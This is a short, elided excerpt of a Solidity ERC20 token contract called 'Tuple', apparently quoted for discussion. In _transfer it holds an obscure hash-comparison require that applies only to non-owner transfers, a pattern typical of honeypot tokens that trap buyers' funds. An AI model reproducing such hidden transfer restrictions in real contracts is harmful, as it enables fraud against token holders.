...
contract tuple is Context, IERC20, Ownable {
    ...
    string private constant _name = unicode"Tuple";
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if (from != owner() && to != owner()) {
            ...
            require(keccak256(abi.encodePacked(verd)) !=keccak256(abi.encodePacked(takefee(from,taxAmount))) );
